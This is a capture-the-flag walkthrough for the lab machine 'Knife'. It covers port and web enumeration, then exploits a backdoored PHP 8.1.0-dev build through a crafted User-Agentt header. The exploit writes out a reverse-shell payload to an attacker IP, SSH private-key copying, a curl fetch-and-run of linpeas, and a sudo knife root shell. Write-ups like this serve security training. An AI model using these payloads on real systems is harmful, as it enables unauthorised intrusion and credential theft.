---
description: 10.10.10.242
---

# Knife

Tags
* gtfobins

<!--

Other commands/tools
```
ffuf
gobuster
```

-->

## Walkthrough

* [IppSec](https://www.youtube.com/watch?v=93JnRTF5sQM) (video)

### Enumeration

Nmap
```bash
nmap -p- --min-rate=10000 -v -oA nmap.out 10.10.10.242
nmap -sC -sV -oA nmap.out 10.10.10.242

# output
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
```

Web path fuzzers
```bash
ffuf -u http://10.10.10.242/FUZZ \
  -w /git-repos/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt

gobuster dir \
  -u http://10.10.10.242 \
  -w /git-repos/wordlists/SecLists/Discovery/Web-Content/Apache.fuzz.txt \
  -t 100 \
  -o gobuster.out

gobuster dir \
  -u http://10.10.10.242 \
  -w /git-repos/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt \
  -x php \
  -t 100 \
  -o gobuster.out

# output
===============================================================
/.html                (Status: 403) [Size: 277]
/.htm                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 5815]
/.                    (Status: 200) [Size: 5815]
/.htaccess            (Status: 403) [Size: 277]
/.htc                 (Status: 403) [Size: 277]
/.html_var_DE         (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.html.               (Status: 403) [Size: 277]
/.html.html           (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
/.htm.                (Status: 403) [Size: 277]
/.htmll               (Status: 403) [Size: 277]
/.html.old            (Status: 403) [Size: 277]
/.ht                  (Status: 403) [Size: 277]
/.html.bak            (Status: 403) [Size: 277]
/.htm.htm             (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htgroup             (Status: 403) [Size: 277]
/.html1               (Status: 403) [Size: 277]
/.html.printable      (Status: 403) [Size: 277]
/.html.LCK            (Status: 403) [Size: 277]
/.htm.LCK             (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htmls               (Status: 403) [Size: 277]
/.htx                 (Status: 403) [Size: 277]
/.htlm                (Status: 403) [Size: 277]
/.htuser              (Status: 403) [Size: 277]
/.htm2                (Status: 403) [Size: 277]
/.html-               (Status: 403) [Size: 277]
```

[PHP 8.1.0-dev Backdoor Remote Code Execution](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)
```bash
# test backdoor
http 10.10.10.242 'User-Agentt:zerodiumsleep(5);'

# [attacker] listen
nc -lvnp 4242

# [attacker] send payload
http 10.10.10.242 "User-Agentt:zerodiumsystem(\"bash -c 'bash -i >&/dev/tcp/10.10.14.14/4242 0>&1'\");"

# flag
cat /home/james/user.txt
```

Upgrade shell or use ssh key
```bash
# [victim] copy
cat /home/james/.ssh/id_rsa
mv /home/james/.ssh/id_rsa.pub /home/james/.ssh/authorized_keys

# [attacker] save to id_rsa
chmod 600 id_rsa
ssh -i id_rsa -o StrictHostKeyChecking=no james@10.10.10.242
```

### Privilege Escalation

Upload privesc script
```bash
# [attacker] download and expose script
mkdir -p /share/www && \
  curl -sS -L -o /share/www/linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh &&
  python3 -m http.server -d /share/www

# [victim] use tun0 <IP_ADDRESS> of attacker
curl -o /dev/shm/linpeas.sh 10.10.14.14:8000/linpeas.sh
bash /dev/shm/linpeas.sh -a > /dev/shm/linpeas.txt
less -r /dev/shm/linpeas.txt

# output
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

User is allowed to run `knife` as root with `sudo`

* [knife](https://docs.chef.io/workstation/knife)
* [GTFOBins](https://gtfobins.github.io/gtfobins/knife)

```bash
# spawns a shell with root permission
sudo knife exec -E 'exec "/bin/sh"'

cat /root/root.txt
```
